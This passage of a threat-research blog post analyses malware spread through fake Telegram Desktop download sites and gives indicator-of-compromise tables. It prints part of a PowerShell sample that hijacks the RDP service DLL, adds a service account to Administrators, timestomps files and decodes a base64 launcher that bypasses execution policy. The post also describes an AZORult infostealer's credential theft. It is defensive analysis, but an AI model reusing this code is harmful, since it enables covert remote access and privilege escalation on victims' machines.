<span style="color: #cccccc">icacls.exe</span> <span style="color: #cccccc">rfxvmt.dll</span> <span style="color: #cccccc">/remove</span> <span style="color: #cd0000">&quot;NT AUTHORITY\SYSTEM&quot;</span>
<span style="color: #cccccc">icacls.exe</span> <span style="color: #cccccc">rfxvmt.dll</span> <span style="color: #cccccc">/grant</span> <span style="color: #cd0000">&quot;NT AUTHORITY\SYSTEM:RX&quot;</span>
<span style="color: #000080">#</span>
<span style="color: #cccccc">icacls.exe</span> <span style="color: #cccccc">rfxvmt.dll</span> <span style="color: #cccccc">/remove</span> <span style="color: #cd0000">&quot;BUILTIN\Administrators&quot;</span>
<span style="color: #cccccc">icacls.exe</span> <span style="color: #cccccc">rfxvmt.dll</span> <span style="color: #cccccc">/grant</span> <span style="color: #cd0000">&quot;BUILTIN\Administrators:RX&quot;</span>
<span style="color: #cccccc">}</span>



<span style="color: #cccccc">REG</span> <span style="color: #cccccc">ADD</span> <span style="color: #cd0000">&quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> <span style="color: #cccccc">/v</span> <span style="color: #cccccc">PortNumber</span> <span style="color: #cccccc">/t</span> <span style="color: #cccccc">REG_DWORD</span> <span style="color: #cccccc">/d</span> <span style="color: #cccccc">0x1C21</span> <span style="color: #cccccc">/f</span>

<span style="color: #cccccc">reg</span> <span style="color: #cccccc">add</span> <span style="color: #cd0000">&quot;HKLM\system\currentcontrolset\services\TermService\parameters&quot;</span> <span style="color: #cccccc">/v</span> <span style="color: #cccccc">ServiceDLL</span> <span style="color: #cccccc">/t</span> <span style="color: #cccccc">REG_EXPAND_SZ</span> <span style="color: #cccccc">/d</span> <span style="color: #00cdcd">$fldr$rf</span> <span style="color: #cccccc">/f</span>

<span style="color: #cccccc">reg</span> <span style="color: #cccccc">add</span> <span style="color: #cd0000">&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services&quot;</span> <span style="color: #cccccc">/v</span> <span style="color: #cccccc">fEnableWddmDriver</span> <span style="color: #cccccc">/t</span> <span style="color: #cccccc">reg_dword</span> <span style="color: #cccccc">/d</span> <span style="color: #cccccc">0</span> <span style="color: #cccccc">/f</span>
<span style="color: #000080">#ShowConsole</span>
<span style="color: #cd00cd">set-service</span> <span style="color: #cccccc">TermService</span> <span style="color: #cccccc">-StartupType</span> <span style="color: #cccccc">Automatic</span>

<span style="color: #000080">#rights</span>

<span style="color: #00cdcd">$s</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">(</span><span style="color: #cd00cd">Get-WmiObject</span> <span style="color: #cccccc">win32_service</span> <span style="color: #cccccc">-filter</span> <span style="color: #cd0000">&quot;Name=&#39;TermService&#39;&quot;</span><span style="color: #cccccc">)</span>
<span style="color: #00cdcd">$s</span><span style="color: #cccccc">.Change(</span><span style="color: #00cdcd">$null</span><span style="color: #cccccc">,</span> <span style="color: #00cdcd">$null</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">16)</span> <span style="color: #000080"># 16 = &quot;Own Process&quot;</span>

<span style="color: #00cdcd">$group</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">Gwmi</span> <span style="color: #cccccc">win32_group</span> <span style="color: #cccccc">-Filter</span> <span style="color: #cd0000">&quot;Domain=&#39;$env:computername&#39; and SID=&#39;S-1-5-32-544&#39;&quot;</span>
<span style="color: #00cdcd">$adm</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$group</span><span style="color: #cccccc">.Name</span>
<span style="color: #00cdcd">$objSID</span> <span style="color: #cccccc">=</span> <span style="color: #cd00cd">New-Object</span> <span style="color: #cccccc">System.Security.Principal.SecurityIdentifier(</span><span style="color: #cd0000">&quot;S-1-5-20&quot;</span><span style="color: #cccccc">)</span>
<span style="color: #00cdcd">$objUser</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$objSID</span><span style="color: #cccccc">.Translate([System.Security.Principal.NTAccount])</span>
<span style="color: #00cdcd">$objUser</span><span style="color: #cccccc">.Value</span>

<span style="color: #cccccc">net</span> <span style="color: #cccccc">localgroup</span> <span style="color: #00cdcd">$adm</span> <span style="color: #00cdcd">$objUser</span><span style="color: #cccccc">.Value</span> <span style="color: #cccccc">/add</span>



<span style="color: #00cdcd">$env:username</span> <span style="color: #cccccc">|</span> <span style="color: #cd00cd">out-file</span> <span style="color: #cccccc">c</span><span style="color: #cccccc; border: 1px solid #FF0000">:</span><span style="color: #cccccc">\windows\temp\usrnm.txt</span>

<span style="color: #00cdcd">$modifyfiles</span> <span style="color: #cccccc">=</span> <span style="color: #cd00cd">Get-ChildItem</span> <span style="color: #cccccc">-force</span> <span style="color: #cd0000">&quot;$fldr&quot;</span>
<span style="color: #cdcd00">foreach</span><span style="color: #cccccc">(</span><span style="color: #00cdcd">$object</span> <span style="color: #cdcd00">in</span> <span style="color: #00cdcd">$modifyfiles</span><span style="color: #cccccc">)</span>
<span style="color: #cccccc">{</span>
<span style="color: #00cdcd">$object</span><span style="color: #cccccc">.CreationTime=(</span><span style="color: #cd0000">&quot;11/11/2014 12:00:00&quot;</span><span style="color: #cccccc">)</span>

<span style="color: #00cdcd">$object</span><span style="color: #cccccc">.LastAccessTime=(</span><span style="color: #cd0000">&quot;11/11/2014 12:00:00&quot;</span><span style="color: #cccccc">)</span>

<span style="color: #00cdcd">$object</span><span style="color: #cccccc">.LastWritetime=(</span><span style="color: #cd0000">&quot;11/11/2014 12:00:00&quot;</span><span style="color: #cccccc">)</span>

<span style="color: #cccccc">}</span>

<span style="color: #000080">#Start-sleep -s 10</span>
<span style="color: #cccccc">cmd</span> <span style="color: #cccccc">/c</span> <span style="color: #cccccc">cmd</span> <span style="color: #cccccc">/c</span> <span style="color: #cccccc">net</span> <span style="color: #cccccc">start</span> <span style="color: #cccccc">rdpdr</span>
<span style="color: #000080">#Go-Online</span>
<span style="color: #000080">#sleep 5</span>
<span style="color: #cccccc">cmd</span> <span style="color: #cccccc">/c</span> <span style="color: #cccccc">cmd</span> <span style="color: #cccccc">/c</span> <span style="color: #cccccc">net</span> <span style="color: #cccccc">start</span> <span style="color: #cccccc">TermService</span>



<span style="color: #00cdcd">$f</span><span style="color: #cccccc">=</span><span style="color: #cd00cd">get-content</span> <span style="color: #cd0000">&quot;$env:temp\uninst.dat.log&quot;</span>

<span style="color: #cd00cd">remove-item</span> <span style="color: #00cdcd">$env:TEMP</span><span style="color: #cccccc">\ex.tmp</span>
<span style="color: #cd00cd">remove-item</span> <span style="color: #00cdcd">$env:TEMP</span><span style="color: #cccccc">\*.ps1</span>
<span style="color: #cd00cd">remove-item</span> <span style="color: #00cdcd">$env:TEMP</span><span style="color: #cccccc">\*.zip</span>
<span style="color: #cd00cd">remove-item</span> <span style="color: #00cdcd">$env:TEMP</span><span style="color: #cccccc">\*.exe</span>
<span style="color: #cccccc">cmd</span> <span style="color: #cccccc">/c</span> <span style="color: #cccccc">del</span> <span style="color: #cdcd00">%</span><span style="color: #cccccc">temp%\*.ps1</span> <span style="color: #cccccc">/f</span>
<span style="color: #cccccc">cmd</span> <span style="color: #cccccc">/c</span> <span style="color: #cccccc">del</span> <span style="color: #cdcd00">%</span><span style="color: #cccccc">temp%\*.txt</span> <span style="color: #cccccc">/f</span>


<span style="color: #cd00cd">remove-item</span> <span style="color: #00cdcd">$f</span>

<span style="color: #cccccc">}</span>




<span style="color: #cdcd00">function</span> <span style="color: #cd00cd">Test-Administrator</span>
<span style="color: #cccccc">{</span>

<span style="color: #00cdcd">$user</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">[Security.Principal.WindowsIdentity]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">GetCurrent()</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #cccccc">(</span><span style="color: #cd00cd">New-Object</span> <span style="color: #cccccc">Security.Principal.WindowsPrincipal</span> <span style="color: #00cdcd">$user</span><span style="color: #cccccc">).IsInRole([Security.Principal.WindowsBuiltinRole]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">Administrator)</span>
<span style="color: #cccccc">}</span>




<span style="color: #000080">#Go-Offline</span>
<span style="color: #000080">#sleep 5</span>
<span style="color: #cccccc">install</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>

<span style="color: #cccccc">}</span> <span style="color: #cdcd00">else</span> <span style="color: #cccccc">{</span>
<span style="color: #00cdcd">$t</span><span style="color: #cccccc">=</span><span style="color: #cd00cd">Get-WmiObject</span> <span style="color: #cccccc">-Namespace</span> <span style="color: #cccccc">root\wmi</span> <span style="color: #cccccc">-Query</span> <span style="color: #cd0000">&quot;SELECT * FROM MSSmBios_RawSMBiosTables&quot;</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span><span style="color: #00cdcd">$s</span><span style="color: #cccccc">=(64*</span><span style="color: #00cdcd">$t</span><span style="color: #cccccc">.SMBiosData[9]+64)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span><span style="color: #cdcd00">if</span><span style="color: #cccccc">(</span><span style="color: #00cdcd">$s</span> <span style="color: #3399cc">-le</span> <span style="color: #cccccc">128){</span>

<span style="color: #cccccc">//Annotation</span> <span style="color: #cccccc">b64</span> <span style="color: #cccccc">string</span><span style="color: #cccccc; border: 1px solid #FF0000">:</span> <span style="color: #cccccc">gju=</span><span style="color: #cd0000">&quot;-eP ByPAsS &quot;</span> <span style="color: #cccccc">dyf</span> <span style="color: #cccccc">=</span> <span style="color: #cd0000">&quot;powErsHell &quot;</span><span style="color: #cccccc">+gju+</span><span style="color: #cd0000">&quot; -F %temp%\ready.ps1&quot;</span> <span style="color: #cccccc">CreateObject(</span><span style="color: #cd0000">&quot;Wscript.Shell&quot;</span><span style="color: #cccccc">).Run</span> <span style="color: #cccccc">dyf,</span> <span style="color: #cccccc">0,</span> <span style="color: #cccccc">false</span>
<span style="color: #000080">#$vb=pasgouta   &quot;ZwBqAHUAPQAiAC0AZQBQACAAQgB5AFAAQQBzAFMAIAAiAAoAZAB5AGYAIAA9ACAAIgBwAG8AdwBFAHIAcwBIAGUAbABsACAAIgArAGcAagB1ACsAIgAgAC0ARgAgACUAdABlAG0AcAAlAFwAcgBlAGEAZAB5AC4AcABzADEAIgAKAAoAQwByAGUAYQB0AGUATwBiAGoAZQBjAHQAKAAiAFcAcwBjAHIAaQBwAHQALgBTAGgAZQBsAGwAIgApAC4AUgB1AG4AIABkAHkAZgAsACAAMAAsACAAZgBhAGwAcwBlAA==&quot; &quot;decrypt&quot;</span>
<span style="color: #cccccc">[System.Text.Encoding]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">Unicode.GetString([System.Convert]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">FromBase64String(</span><span style="color: #00cdcd">$vb</span><span style="color: #cccccc">))|</span><span style="color: #cd00cd">out-file</span> <span style="color: #cd0000">&quot;$env:temp\start.vbs&quot;</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #000080">#write-host exec bp;</span>
<span style="color: #000080">#bnsuurh;</span>

<span style="color: #cccccc">}</span><span style="color: #cdcd00">else</span><span style="color: #cccccc">{</span>

<span style="color: #cccccc">//Annotation</span> <span style="color: #cccccc">b64</span> <span style="color: #cccccc">string</span><span style="color: #cccccc; border: 1px solid #FF0000">:</span> <span style="color: #cccccc">gju=</span><span style="color: #cd0000">&quot;-eP ByPAsS &quot;</span><span style="color: #cccccc">dyf</span> <span style="color: #cccccc">=</span> <span style="color: #cd0000">&quot;powErsHell &quot;</span><span style="color: #cccccc">+gju+</span><span style="color: #cd0000">&quot; -F %temp%\ready.ps1&quot;</span> <span style="color: #cccccc">CreateObject(</span><span style="color: #cd0000">&quot;Wscript.Shell&quot;</span><span style="color: #cccccc">).Run</span> <span style="color: #cccccc">dyf,</span> <span style="color: #cccccc">0,</span> <span style="color: #cccccc">false</span>
<span style="color: #00cdcd">$vb</span><span style="color: #cccccc">=</span><span style="color: #cd0000">&quot;ZwBqAHUAPQAiAC0AZQBQACAAQgB5AFAAQQBzAFMAIAAiAAoAZAB5AGYAIAA9ACAAIgBwAG8AdwBFAHIAcwBIAGUAbABsACAAIgArAGcAagB1ACsAIgAgAC0ARgAgACUAdABlAG0AcAAlAFwAcgBlAGEAZAB5AC4AcABzADEAIgAKAAoAQwByAGUAYQB0AGUATwBiAGoAZQBjAHQAKAAiAFcAcwBjAHIAaQBwAHQALgBTAGgAZQBsAGwAIgApAC4AUgB1AG4AIABkAHkAZgAsACAAMAAsACAAZgBhAGwAcwBlAA==&quot;</span>
<span style="color: #cccccc">[System.Text.Encoding]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">Unicode.GetString([System.Convert]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">FromBase64String(</span><span style="color: #00cdcd">$vb</span><span style="color: #cccccc">))|</span><span style="color: #cd00cd">out-file</span> <span style="color: #cd0000">&quot;$env:temp\start.vbs&quot;</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #cd00cd">write-host</span> <span style="color: #cccccc">exec</span> <span style="color: #cccccc">bp</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #cccccc">bnsuurh</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #cccccc">}</span>


<span style="color: #cccccc">}??????</span>
</pre></td></tr></table></div>
<br />

As we can see the malware establishes persistence over the RDP service.<br />
It also hides it's changes using the timestomping technique and tries to gather administrative privileges.<br /><br />


Spyse.com identified the host to be a shared hosting in Moldova.<br />
The web service promotes itself that it takes Bitcoin as payment option so it seems like a great hosting for criminals.<br />
<img src="/static/article_images/telegram_malware/malware_host.PNG" height="60%"><img><br /><br />	

Spyse found additional sites with the same portal, but both seem to be down by the time of this writeup:<br />
<img src="/static/article_images/telegram_malware/spyse_com_ipv4.PNG" height="60%"><img><br /><br />

Looking at domains with the same A record illustrates that the threat actors probably used a shared hosting plan:<br />
<img src="/static/article_images/telegram_malware/shared_hosting.PNG" height="60%"><img><br /><br />


<h1>Analysis telegramdesktop.com malware (TGInstaller.exe)</h1><br />
The binary is a .NET executable which is decompilable via dnSpy.<br />
On first analysis we can notice that the binary is heavily obfuscated.<br />
Using <a href="https://github.com/de4dot/de4dot">de4dot</a> it was possible to get some clarity into it.<br /><br />

One observed function is the establishment of persistence via scheduled tasks:<br />
<img src="/static/article_images/telegram_malware/persistence.PNG" height="60%"><img><br /><br />

There's also an executable that gets dropped:<br />
<img src="/static/article_images/telegram_malware/com_drop.PNG" height="60%"><img><br /><br />

Let's look at the second stage payload:<br />
<img src="/static/article_images/telegram_malware/com_drop_infos.PNG" height="60%"><img><br />
The strings seem like they've been used by a different campaign disguising itself as a counter-strike management tool.<br /><br />

The new binary is not packed and reveals a lot of functionality:<br />
<img src="/static/article_images/telegram_malware/com_functions.PNG" height="60%"><img><br />
Even though it tries to disguise itself by using seemingly harmless package names such as Microsoft.Contents and Microsoft.Data.Browsers.Chromium the function names are very clear.<br /><br />

The malware is a spyware and allows for, for example, the following functionality:
<ul>
<li>Stealing of FileZilla credentials</li>
<li>Stealing of NordVPN credentials</li>
<li>Stealing of OpenVPN credentials</li>
<li>Retrieving of arbitrary files</li>
<li>Stealing of Crypo wallets</li>
<li>Stealing of Telegram history</li>
<li>Stealing of stored Chrome credit cards</li>
<li>Stealing of stored Chrome cookies</li>
<li>Stealing of stored Chrome autofills</li>
<li>Stealing of stored Chrome passwords</li>
<li>Stealing of stored Firefox passwords</li>
<li>Stealing of geographical location</li>
</ul><br />

Analyzing the functionality is comparitively easy. The malware just adds some additional characters to an array that it replaces with whitespace upon pasing to the target function.<br />
<img src="/static/article_images/telegram_malware/com_drop_tg.PNG" height="60%"><img><br /><br />

The main C2 functionality happens in the Microsoft.Data.Core package in a class called AhnLabldiNaxui:<br />
<img src="/static/article_images/telegram_malware/com_drop_conn.PNG" height="60%"><img><br /><br />

Tracing this we find the C2 server hardcoded in the Microsoft.Data.Core.Launchers under the Executor class:<br />
<img src="/static/article_images/telegram_malware/com_drop_c2.PNG" height="60%"><img><br /><br />

Let's dig deeper into the C2 sttthayre.site:<br />
<img src="/static/article_images/telegram_malware/spyse_c2.PNG" height="60%"><img><br /><br />

Spyse attributes the host to a company called "American Australian Business Council.<br />
<img src="/static/article_images/telegram_malware/spyse_AABC.PNG" height="60%"><img><br /><br />

The c2 doesn't have any subdomains apart from www and a portscan only identified SSH, HTTP and HTTPS to be open.<br />

Looking at the embedded strings we could identify the malware as a AZORult Infostealer variant:<br />
<a href="https://www.proofpoint.com/us/threat-insight/post/new-version-azorult-stealer-improves-loading-features-spreads-alongside">https://www.proofpoint.com/us/threat-insight/post/new-version-azorult-stealer-improves-loading-features-spreads-alongside</a><br />
<a href="https://blogs.infoblox.com/cyber-threat-intelligence/azorult-infostealer/">https://blogs.infoblox.com/cyber-threat-intelligence/azorult-infostealer/</a><br /><br />

AZORult was being used in malvertising campaigns targeting a popular VPN service, as well as using COVID-19 themed campaigns.  <br /><br />












<h1>Analysis telegramdesktop.net site</h1><br />

When looking at the .net site we see a similar tactic but using a different bitbucket account. <br>
This one is called LLCtruster and doesn't provide commit metadata. <br>
<img src="/static/article_images/telegram_malware/netrepo.PNG" height="60%"><img><br /><br />

And only contains one repository:<br />
<img src="/static/article_images/telegram_malware/llctrusting.PNG" height="60%"><img><br /><br />

As well as one project:<br />
<img src="/static/article_images/telegram_malware/llctrustingprojects.PNG" height="60%"><img><br /><br />

With one hosted file:<br />
<ul>
<li>https://bitbucket.org/LLCtruster/download/downloads/TelegramInstaller-1.exe</li>
</ul><br /><br />	


<h1>Analysis telegramdesktop.org site</h1><br />

Interestingly the .org page does not rely on bitbucket but uses a custom tupdate.net site to host it's payload. <br>
The tupdate site is also registered by namecheap.com. <br />
<center>
    <img src="/static/article_images/telegram_malware/tupdate_namecheap.png" height="60%" />
</center>
<br />
<br />

The site features several subdomains: <br />
<center>
    <img src="/static/article_images/telegram_malware/tupdate_subdomains.PNG" height="60%" />
</center>
<br />
<br />

When accessing the link without a download we get an error page which might be on purpose or because of namecheap.<br>
<center>
    <img src="/static/article_images/telegram_malware/tupdate.PNG" height="60%" />
</center>
<br />
<br />

Same with the ftp subdomain: <br />
<center>
    <img src="/static/article_images/telegram_malware/ftperror.PNG" height="60%" />
</center>
<br />
<br />

The ftp site's certificate is issued to a namecheap domain: <br />
<center>
    <img src="/static/article_images/telegram_malware/tupdate_certificate.PNG" height="60%" />
</center>
<br />
<br />





<h1>IOC's</h1><br />
The following indicators of compromise can be used to hunt for traces of the malware.



<h2>Network</h2>
<div class="w-700 mw-full">
    <div class="card p-0 bg-very-dark-dm"> 
        <div class="table-responsive">
            <table class="table table-bordered">
                <thead>
                    <tr>
                        <td><b>Type</b></td>
                        <td><b>Indicator</b></td>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>URI</td>
                        <td>telegramdesktop.com (162.213.251.93 - AS22612 - NAMECHEAP-NET)</td>
                    </tr>
                    <tr>
                        <td>URI</td>
                        <td>telegramdesktop.net (162.213.251.147 - AS22612 - NAMECHEAP-NET)</td>
                    </tr>
                    <tr>
                        <td>URI</td>
                        <td>telegramdesktop.org (162.0.215.213 - AS22612 - NAMECHEAP-NET)</td>
                    </tr>
                    <tr>
                        <td>IP</td>
                        <td>94.158.245.88 - AS39798 - MivoCloud SRL</td>
                    </tr>
                    <tr>
                        <td>URI</td>
                        <td>bitbucket.org/LLCTRUST/softwarellc (104.192.141.1 - AS16509 - AMAZON-02)</td>
                    </tr>
                    <tr>
                        <td>URI</td>
                        <td>bitbucket.org/LLCTRUST/waskotrustedllc (104.192.141.1 - AS16509 - AMAZON-02)</td>
                    </tr>
                    <tr>
                        <td>URI</td>
                        <td>bitbucket.org/takax/1 (104.192.141.1 - AS16509 - AMAZON-02)</td>
                    </tr>
                    <tr>
                        <td>URI</td>
                        <td>bitbucket.org/LLCtruster/download (104.192.141.1 - AS16509 - AMAZON-02)</td>
                    </tr>
                    <tr>
                        <td>URI</td>
                        <td>tupdate.net/tsetup.2.5.1.exe: 162.213.251.149 - AS22612 - NAMECHEAP-NET</td>
                    </tr>
                    <tr>
                        <td>URI</td>
                        <td>sttthayre.site: (94.140.115.92 - AS43513 - Sia Nano IT)</td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
</div>


<h2>Files</h2>
<div class="w-700 mw-full">
    <div class="card p-0 bg-very-dark-dm"> 
        <div class="table-responsive">
            <table class="table table-bordered">
                <thead>
                    <tr>
                        <td><b>Name</b></td>
                        <td><b>MD5</b></td>
                        <td><b>CRC32</b></td>
                        <td><b>SHA-256</b></td>
                    </tr>
                </thead>
                <tbody>
                    <tr><td>12.bat									</td><td>b8e4a5445afd82cc60f750af508a2b1a</td>	<td>ee227dd5</td>	<td>7ea496cdfac7994cdf05b2969c70b6c36e3bb8c0841dc2fcbcbe0e623970a39c</td></tr>	
                    <tr><td>clr.exe									</td><td>2eb989ff97ff6fef2f157d65be918f25</td>	<td>b9b381f0</td>	<td>da1c685c7a40495abafb6db78d7baca671f88b463fbdd1d3c4e906f7e994f349</td></tr>	
                    <tr><td>Get-Content.ps1							</td><td>35c34f487155cf7fc72c3146bfa1a016</td>	<td>92854983</td>	<td>b65273062c9be6bfc6343438e51d7f68aaecf8382ae1373ff1b3adfacff1fd5d</td></tr>	
                    <tr><td>mae.ps1									</td><td>dbd0a5fb31fdf76cf0d7dfa2e67adeb7</td>	<td>c98fae3f</td>	<td>42c277ada9c6f8ddcd6211e4792a8df1fa0d0ad8cbb867eee1a431cc1b79834d</td></tr>	
                    <tr><td>RDP.exe									</td><td>90df033c35877ce3afe2d5fc10a9dad9</td>	<td>0c50e20e</td>	<td>4bb7855a190cdc9322508ef836eb9ef739de76158245462a207f1676e98608dd</td></tr>	
                    <tr><td>ready.ps1								</td><td>a91d27b7362a72f33b4e89e4087b62db</td>	<td>9464eb7d</td>	<td>5b6b7899dd459fa0bb234a0b102af91f4ee412abf36b1c54d1253ae59dda6ee2</td></tr>	
                    <tr><td>start.vbs								</td><td>9e3905e054e78547ec4fbbbb73e92b78</td>	<td>6fbc44ad</td>	<td>5d4a0661cfb3cca59acd8a9fa433ec2c48d686da36f3890b73e7b9f37c60e980</td></tr>	
                    <tr><td>TelegramInstaller.exe					</td><td>4226ddfa64f91d76033ac6f51b326d02</td>	<td>b5ba217d</td>	<td>36152684fd71dd33228715ffd5b3e72e75f91906e8365f0aa3eff497801deca3</td></tr>	
                    <tr><td>Crycker.exe	d							</td><td>a71ff9f79c995a0ed1e1f26dd85586f</td>	<td>be1cdb18</td>	<td>631fcb530b12dfda93e88c24350c55a708c07969efacae950139dc192fa8d372</td></tr>	
                    <tr><td>Discord_x86_Setup.exe					</td><td>bbed0ddebf7ec894e20a77b670befcd8</td>	<td>af78cad6</td>	<td>c9215827866b2daaa79e964bef45238b138dd60a69fcf7fb04f057cbdd38fe25</td></tr>	
                    <tr><td>DRX.exe									</td><td>12dea79ef46da2b26230e9ebe29c2f51</td>	<td>cfc96df5</td>	<td>bff61a79b40c68375c9ce4117425b7ccca34e8714d71926159576fb08842c350</td></tr>	
                    <tr><td>LLCTRUST-softwarellc-31a6a41f7711.zip	</td><td>49cf21cd3afce1181d5eb167af21ec8b</td>	<td>6d3ec98e</td>	<td>d0da353baf81f8fe198333c713f5e8adcbe7b1477f6f0638f6502e6d55c292e9</td></tr>	
                    <tr><td>RuntimeBroker.exe						</td><td>8e1f82d4f79bd42224fdc9aaae61fafc</td>	<td>0a6636ee</td>	<td>677bf0b5ec326252e015894397c6c1ada5bd3909ee07dde9d3cc0861f4193497</td></tr>	
                    <tr><td>rxr.exe									</td><td>a15dfe52183ac1d6d93b43a1dba17082</td>	<td>1ff78ced</td>	<td>7de531c3c70bf09290d5faa72e1f4981fe960149f303919fa0db5274a1a43b06</td></tr>	
                    <tr><td>SmartScreenUpdater.exe					</td><td>6843f879344da78d6f932411ebc564c7</td>	<td>18d88b41</td>	<td>1cdc5da577d130894f9dfa501e76642d8a959c0703f95b4135ba241aff4661d4</td></tr>	
                    <tr><td>SoftwareUpdate.exe						</td><td>81e7d53d21c778d8f15dbb5e4add5001</td>	<td>c2fb878e</td>	<td>2ecf860cef78ae5fda4f44efc66c47b6ccd1c78d4996fdf0056d8af189931985</td></tr>	
                    <tr><td>TelegramInstaller.exe					</td><td>21f103ff6a28e4cc47a1a144bb5cfa39</td>	<td>9ae5072e</td>	<td>533ab53d504c4d7378b68247bb83f10d2a836a37ae744dba05fb262e01abfd76</td></tr>	
                    <tr><td>TelegramInstallerX86.exe				</td><td>6fa152dee435c85812ab8e2bd7ff880a</td>	<td>099fbcff</td>	<td>0c6db9bc03740180548cfda8bf49984c81ef21538787e7ddec488f6c7205e69e</td></tr>	
                    <tr><td>TGInstaller.exe							</td><td>ac6fc577d6b6b968869fd3221c4f61fe</td>	<td>4f7544e0</td>	<td>45d15117b89ab89201e577e9bfc9aed22713099dec0e95b5e0ee72dbe031d1c8</td></tr>	
                    <tr><td>TGInstaller.scr							</td><td>ac6fc577d6b6b968869fd3221c4f61fe</td>	<td>4f7544e0</td>	<td>45d15117b89ab89201e577e9bfc9aed22713099dec0e95b5e0ee72dbe031d1c8</td></tr>	
                    <tr><td>zxc.exe									</td><td>035ce15ab6e6090a8f358a2c4ed46448</td>	<td>4d7191d0</td>	<td>e6c6ab1a4b6382f16126f1e51d65af42653b2a608d60d3dd9b69a5a3069a8145</td></tr>	
                    <tr><td>TelegramInstaller-1.exe					</td><td>658912b29decd2f865e9ea7f42c0ddbc</td>	<td>a86fb774</td>	<td>44f87d5035305fb93a964d12f0605f06793222caeb6c3a118453113af3e11127</td></tr>	
                    <tr><td>tsetup.2.5.1.exe						</td><td>a519d069642bdf2f1b43e867c8d071fd</td>	<td>e6b27081</td>	<td>836ce1b2d00fabdba998f9946844b2f7c70f706a84a63d73cf31cb93f042cc75</td></tr>	
                    
                </tbody>
            </table>
        </div>
    </div>
</div>
    <br />
    <br />

    

    



    


    <script>hljs.highlightAll();</script>
    <br />
    <br />
</div>
                </div>
            </div>
            <nav class="navbar navbar-fixed-bottom">
                <div class="navbar-content">
                    <a href="https://twitter.com/_setuid0_"><i class="twitter icon" style="color:white;"></i></a>
                    <a href="https://github.com/setuid0-sec"><i class="github icon" style="color:white;"></i></a>
                </div>
                <a href="#" class="navbar-brand ml-auto" style="font-size:14px; font-weight:normal;"> 
                    setuid(0); Research Team
                </a>
                <span class="navbar-text ml-auto">
                    &copy; setuid(0);
                </span>
                </nav>
        </div>

        <script src="/static/js/halfmoon.min.js"></script>
        <script>
            halfmoon.toggleDarkMode();
        </script>

        <style type="text/css">

            .content-wrapper {
                background-color: rgba(37, 40, 44, 0.9);
            }

            .page-wrapper {
                background-image: url('/static/img/background.gif');
            }

        </style>  

    </body>
</html>